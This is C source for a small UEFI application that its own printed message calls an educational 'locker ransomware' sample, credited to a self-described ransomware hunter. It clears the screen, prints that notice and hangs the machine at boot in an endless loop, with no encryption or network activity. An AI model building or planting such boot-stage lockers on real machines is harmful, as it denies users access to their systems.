#include <efi.h>
#include <efilib.h>

EFI_STATUS efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)
{
    InitializeLib(ImageHandle, SystemTable);
    EFI_STATUS Status;
    UINTN Columns;
    UINTN Rows;
    int i;

    for (i = 0; i <= SystemTable->ConOut->Mode->MaxMode; i++) {
        Status = SystemTable->ConOut->QueryMode(SystemTable->ConOut, i, &Columns, &Rows);
        if (Status == EFI_SUCCESS) {
            if (Columns == 80 && Rows == 25) {
                uefi_call_wrapper(SystemTable->ConOut->SetMode, 1, SystemTable->ConOut, i);
            }
        }
    }

    uefi_call_wrapper(SystemTable->ConOut->SetAttribute, 1, SystemTable->ConOut, 0x0F); 
    uefi_call_wrapper(SystemTable->ConOut->ClearScreen, 1, SystemTable->ConOut);
    uefi_call_wrapper(SystemTable->ConOut->EnableCursor, 1, SystemTable->ConOut, 0); 
    Print(L"Created by Emirhan Ucan this UEFI locker ransomware is just educational purposes only\n"
                "It's use gnu-efi 2.018 so if this get detected then gnu-efi 2.018 files going to be detected\n\n" 
                "So please don't use for bad purposes my mail is semaemirhan555@gmail.com you can contact it \n\n"
                "My Antvirus project https://github.com/HydraDragonAntivirus/XylentOptionalScanner\n\n"
                "By Ransomware hunter Emirhan Ucan it's Under GPLv2 license"
    );
    while (1);
    return EFI_SUCCESS;
}